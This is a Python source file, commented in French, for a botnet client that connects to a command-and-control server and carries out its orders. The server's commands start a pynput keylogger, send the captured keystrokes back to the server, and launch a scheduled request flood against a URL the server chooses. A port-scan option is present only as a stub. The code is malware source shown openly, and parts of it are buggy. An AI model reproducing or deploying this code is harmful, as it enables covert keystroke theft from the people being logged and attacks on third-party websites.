import datetime
import socket
import threading
import time

import requests
from pynput.keyboard import Listener


# ------------------------------------------------

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# ------------------------------------------------

class Client:
    # Classe du client
    def __init__(self, host, port):
        global ClientConnecte
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connection au socket
        print(f"{Colors.BOLD}En attente de connexion.. {Colors.ENDC}")
        time.sleep(5)
        ClientConnecte = True
        while ClientConnecte:
            try:
                self.sock.connect((host, port))
                print(f"{Colors.BOLD}Bot connecté{Colors.ENDC}")
                threading.Thread(target=self.RecvServeur).start()
                threading.Thread(target=self.sendServeur).start()
                break #Sans se break ça lance erreur de connexion en boucle
            except socket.error as msg:
                print(f"{Colors.FAIL}Erreur de connexion{Colors.ENDC}: " + str(msg))
                break

    # Envoi des données vers le serveur
    def sendServeur(self):
        print(f"{Colors.OKGREEN}Bot prêt à envoyer des données{Colors.ENDC}")
        while ClientConnecte:
            try:
                msgClient = ""
                self.sock.send(msgClient.encode("utf-8"))
            except socket.error as msg:
                print(f"{Colors.FAIL}Connexion expirée:  {Colors.ENDC}" + str(msg))
                break

    # Reception des données par le seveur
    # Le menu principale est compris dans le code ci-dessous
    def RecvServeur(self):
        global ClientConnecte, LockKeylog
        print(f"{Colors.OKBLUE}Bot prêt à recevoir des ordres {Colors.ENDC}")
        try:
            while ClientConnecte:
                msgServeur = self.sock.recv(1024).decode("utf-8")
                print(f"{Colors.OKBLUE}Serveur>> {Colors.ENDC}", msgServeur)

                if msgServeur == "1":
                    pass

                elif msgServeur == "2":
                    #--------------------------KEYLOGGER------------------------------
                    # DIFFERENT CHOIX POUR KEYLOG
                    msgKey = self.sock.recv(1024).decode("utf-8")

                    if msgKey == "START":
                        threading.Thread(target=self.Keylogger).start()

                    elif msgKey == "STOP":
                        LockKeylog = True

                    # ENVOI DU FICHIER TXT
                    elif msgKey == "GET":
                        stockage = ""
                        self.sock.send("Envoi du fichier en cours.. ".encode("utf-8)"))
                        time.sleep(2)
                        NbLigne = int(self.sock.recv(1024).decode("utf-8"))
                        print(NbLigne)
                        if NbLigne == 0:
                            log = open("logs.txt", "r+")
                            for i in log.readline():
                                stockage += i
                        else:
                            log = open("logs.txt", "r+")
                            i = 0
                            for lines in log.readline():
                                line = lines.rstrip()
                                if i < NbLigne:
                                    stockage += line
                                    i += 1

                        log.close()
                        self.sock.send(stockage.encode("utf-8"))
                        self.sock.send("Fin de l'envoi. ".encode("utf-8"))

                    # --------------------------FIN KEYLOGGER------------------------------
                elif msgServeur == "3":
                    print(f"{Colors.OKGREEN}Port Scan{Colors.ENDC}")
                    pass

                elif msgServeur == "4":
                   url = self.sock.recv(1024).decode("utf-8")
                   self.ActivationDDOS(url)

                elif msgServeur == "5":
                    print(f"{Colors.BOLD} Déconnexion par le Master {Colors.ENDC}")
                    self.sock.close()
                    ClientConnecte = False
        except socket.error as msg:
            print(f"{Colors.FAIL}Déconnexion : {Colors.ENDC}" + str(msg))

    def Keylogger(self):
        global LockKeylog

        def get_key(key):
            key_format = str(key).replace("'", "")
            write_logs(key_format)

        def write_logs(key):
            f = open("logs.txt", "a")
            if str(key).find("space") > 0:
                f.write(" ")
            elif str(key).find("Key") != 0:
                f.write(str(key))

        def stop_logger(key):
            if LockKeylog:
                self.sock.send("Fin du Keylogger.".encode("utf-8"))
                return False

        with Listener(on_press=get_key, on_release=stop_logger) as listener:
            self.sock.send("En écoute.. ".encode("utf-8"))
            time.sleep(2)
            listener.join()

    def ActivationDDOS(self, url):

        i = 0
        today = datetime.datetime.now()
        today.strftime('%m-%d-%h-%M')

        mois = int(self.sock.recv(4096).decode("utf-8"))
        jour = int(self.sock.recv(4096).decode("utf-8"))
        heure = int(self.sock.recv(4096).decode("utf-8"))
        minute = int(self.sock.recv(4096).decode("utf-8"))

        self.sock.send("Attente de DDOS..".encode("utf-8"))

        #print(mois, today.month)
        #print(type(mois), type(today.month))
        #print(jour, today.day)
        #print(type(jour), type(today.day))
        #print(heure, today.hour)
        #print(type(heure), type(today.hour))
        #print(minute, today.minute)
        #print(type(minute), type(today.minute))

        LockDDOS = True

        while LockDDOS:
            if today.month == mois and today.day == jour and today.hour == heure and today.minute == minute:
                try:
                    while i < 10:
                        r = requests
                        r.get(url)
                        i += 1
                    self.sock.send(f"{Colors.OKGREEN}DDOS Réussis {Colors.ENDC}".encode("utf-8"))
                    LockDDOS = False

                except requests.exceptions.InvalidURL:
                    self.sock.send(f"{Colors.FAIL}Erreur du DDOS {Colors.ENDC}".encode("utf-8"))


# -------------------------------------------------------------------------------------------#
if __name__ == "__main__":
    ClientConnecte = False
    LockKeylog = False
    host = "127.0.0.1"
    port = 6666
    Monclient = Client(host, port)

# -------------------------------------------------------------------------------------------#
